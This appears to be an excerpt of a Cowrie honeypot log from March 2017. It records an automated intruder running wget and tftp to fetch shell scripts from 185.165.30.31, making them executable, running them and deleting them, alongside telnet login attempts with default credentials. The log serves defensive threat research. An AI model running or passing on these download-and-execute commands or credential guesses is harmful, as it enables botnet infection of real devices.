+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:57+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:58+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:59+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt: 59372
+2017-03-05T16:45:59+0000 [CowrieTelnetTransport,41688,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt [administrator/1234] failed
+2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:38979 (10.8.41.81:2223) [session: TT41689]
+2017-03-05T16:46:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:52806 (10.8.41.81:2223) [session: TT41690]
+2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt: 59373
+2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] login return, expect: [root/666666]
